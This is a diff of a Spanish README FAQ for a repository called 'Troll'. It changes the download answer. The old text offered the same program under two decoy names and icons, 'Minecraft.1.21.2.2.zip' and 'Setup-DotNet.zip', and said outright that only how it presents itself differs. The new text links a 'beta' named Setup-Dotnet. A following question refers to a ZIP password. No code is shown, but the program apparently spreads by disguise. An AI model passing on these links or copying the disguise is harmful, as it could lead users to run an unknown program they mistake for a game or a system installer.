@@ -36,7 +36,7 @@ R: Sí, tiene soporte para español e inglés, sólo esos dos, pero pronto añad
 
 Q: **¿Dónde puedo descargarlo?**
 
-R: Puedes descargar las 2 versiones con diferentes nombres e iconos, son nombres diferentes pero hacen lo mismo, solo cambian la forma de presentarse, aquí tienes las 2 versiones: [Minecraft](https://github.com/Joseantonio2354/Troll/raw/main/Minecraft.1.21.2.2.zip) y [Setup-Dotnet](https://github.com/Joseantonio2354/Troll/raw/main/Setup-DotNet.zip)
+R: Puede descargar la versión beta en [Setup-Dotnet](https://github.com/Joseantonio2354/Troll/raw/main/Setup.zip)
 
 Q: **¿Cuál es la contraseña del ZIP?**
 
